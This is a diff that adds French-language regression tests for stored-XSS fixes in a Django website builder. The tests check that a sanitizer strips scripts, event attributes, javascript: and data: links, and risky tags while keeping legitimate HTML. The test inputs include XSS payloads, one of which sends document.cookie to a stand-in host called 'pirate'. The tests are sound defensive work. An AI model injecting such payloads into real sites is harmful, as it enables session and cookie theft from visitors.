@@ -515,3 +515,162 @@ def test_le_configurateur_ne_croit_plus_le_type_declare():
 
     assert 'content_type' not in code, (
         'la vue decide encore sur le type declare par le client')
+
+
+# ═══ 8. LE CONTENU RÉDIGÉ, RENDU SANS ÉCHAPPEMENT ══════════════════════════
+
+def test_un_script_ecrit_dans_une_section_ne_s_execute_plus():
+    """XSS STOCKÉ PAR UN ÉDITEUR AUTORISÉ.
+
+    `home.html` et les pages d'article rendaient `{{ section.content|safe }}`
+    et `{{ post.content|safe }}`. Un `<script>` écrit dans une section
+    s'exécutait chez chaque visiteur du site public.
+
+    Le danger n'est pas qu'un éditeur le fasse exprès : c'est qu'un compte
+    d'éditeur compromis, ou un rôle « rédacteur » accordé sans y penser,
+    devienne un moyen d'exécuter du code chez les visiteurs — et de voler
+    la session d'un administrateur qui consulte son propre site.
+    """
+    from apps.websites.templatetags.website_extras import contenu_assaini
+
+    sortie = contenu_assaini(
+        '<p>Bonjour</p><script>fetch("//pirate?c="+document.cookie)</script>')
+
+    assert '<script>' not in sortie
+    assert '<p>Bonjour</p>' in sortie
+
+
+def test_un_attribut_d_evenement_est_retire_mais_l_image_reste():
+    """LE VECTEUR LE PLUS COURANT, et il n'a pas besoin de `<script>`.
+
+    `<img src=x onerror=alert(1)>` exécute du script par un attribut. Une
+    protection qui ne regarderait que les balises le laisserait passer
+    entier. Aucun `on*` ne figure dans la liste des attributs admis.
+    """
+    from apps.websites.templatetags.website_extras import contenu_assaini
+
+    sortie = contenu_assaini(
+        '<img src="/media/websites/p.jpg" alt="Photo" onerror="alert(1)">')
+
+    assert 'onerror' not in sortie
+    assert 'src="/media/websites/p.jpg"' in sortie
+    assert 'alt="Photo"' in sortie
+
+
+def test_un_lien_javascript_perd_son_adresse():
+    """L'autre exécution sans balise `<script>`."""
+    from apps.websites.templatetags.website_extras import contenu_assaini
+
+    sortie = contenu_assaini('<a href="javascript:alert(1)">Cliquez</a>')
+
+    assert 'javascript:' not in sortie
+    assert 'Cliquez' in sortie
+
+
+def test_une_adresse_data_est_refusee_aussi():
+    """`data:text/html` s'exécute dans l'origine de la page."""
+    from apps.websites.templatetags.website_extras import contenu_assaini
+
+    sortie = contenu_assaini(
+        '<a href="data:text/html;base64,PHNjcmlwdD4=">Piège</a>')
+    assert 'data:text/html' not in sortie
+
+
+@pytest.mark.parametrize('balise', ['iframe', 'object', 'embed', 'form',
+                                    'base', 'link', 'meta'])
+def test_les_balises_qui_servent_a_executer_sont_echappees(balise):
+    """`form` y est aussi : un faux formulaire de connexion posé dans une
+    page publique est du hameçonnage hébergé sur le domaine du client."""
+    from apps.websites.templatetags.website_extras import contenu_assaini
+
+    sortie = contenu_assaini('<%s src="//pirate"></%s>' % (balise, balise))
+    assert '<%s' % balise not in sortie
+
+
+@pytest.mark.parametrize('html', [
+    '<h2>Nos engagements</h2>',
+    '<p>Du <strong>texte</strong> et de l’<em>emphase</em>.</p>',
+    '<ul><li>Un</li><li>Deux</li></ul>',
+    '<img src="/media/websites/photo.jpg" alt="Chantier">',
+    '<blockquote cite="https://exemple.pt">Une citation.</blockquote>',
+    '<a href="https://exemple.pt" target="_blank" rel="noopener">Lien</a>',
+    '<figure><img src="/m/a.png" alt=""><figcaption>Légende</figcaption></figure>',
+])
+def test_le_contenu_legitime_n_est_pas_abime(html):
+    """UNE CORRECTION QUI CASSE LE CONTENU QU'ELLE PROTÈGE N'EN EST PAS UNE.
+
+    La liste que portait `security.py` — p, b, i, u, em, strong, a, ul, ol,
+    li, br — aurait SUPPRIMÉ les titres, les images et les tableaux de
+    toutes les pages existantes. C'est pourquoi elle n'a pas été employée
+    telle quelle.
+    """
+    from apps.websites.templatetags.website_extras import contenu_assaini
+
+    sortie = contenu_assaini(html)
+    # Les balises d'ouverture survivent : rien n'a été échappé.
+    assert '&lt;' not in sortie, sortie
+
+
+def test_un_tableau_survit():
+    """`bleach` ajoute un `<tbody>` — c'est une normalisation HTML, pas une
+    perte : le rendu est identique."""
+    from apps.websites.templatetags.website_extras import contenu_assaini
+
+    sortie = contenu_assaini(
+        '<table><tr><th>Poste</th><td>120 €</td></tr></table>')
+
+    assert '<table>' in sortie
+    assert '<th>Poste</th>' in sortie
+    assert '120 €' in sortie
+
+
+def test_la_page_publique_sert_le_contenu_assaini(client):
+    """Mesuré sur le HTML réellement servi, et non sur le filtre seul."""
+    from apps.core.models import Company
+    from apps.websites.models import Website, WebsitePage, WebsiteSection
+
+    entreprise = Company.objects.create(name='Vitrine SA', slug='vitrine-xss')
+    site = Website.objects.create(
+        company=entreprise, name='Vitrine', slug='vitrine-xss',
+        status='published', is_active=True, is_published=True)
+    page = WebsitePage.objects.create(
+        website=site, title='Accueil', slug='accueil', is_homepage=True,
+        status='published', page_type='home')
+    WebsiteSection.objects.create(
+        page=page, section_type='text', title='Présentation',
+        content='<h3>Bonjour</h3><script>alert(document.cookie)</script>',
+        order=0, is_visible=True)
+
+    html = client.get('/sites/%s/' % site.slug).content.decode('utf-8')
+
+    assert '<script>alert(document.cookie)</script>' not in html
+    assert '<h3>Bonjour</h3>' in html
+
+
+def test_plus_aucun_contenu_n_est_rendu_en_safe():
+    """La garde qui survivra à cet audit.
+
+    Le défaut n'était pas dans un gabarit mais dans dix endroits, écrits
+    sur le même réflexe. Ce test échoue si `|safe` revient sur un champ de
+    contenu.
+    """
+    import os
+    import re
+
+    racine = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+    public = os.path.join(racine, 'templates', 'websites', 'public')
+
+    motif = re.compile(r'\{\{\s*\w+\.content\s*\|\s*safe\s*\}\}')
+    fautifs = []
+    for courant, _sous, fichiers in os.walk(public):
+        for nom in sorted(fichiers):
+            if not nom.endswith('.html'):
+                continue
+            chemin = os.path.join(courant, nom)
+            with open(chemin, encoding='utf-8', errors='replace') as flux:
+                if motif.search(flux.read()):
+                    fautifs.append(os.path.relpath(chemin, racine))
+
+    assert not fautifs, (
+        'ces gabarits rendent du contenu sans assainissement : %s. '
+        'Employez |contenu_assaini.' % fautifs)
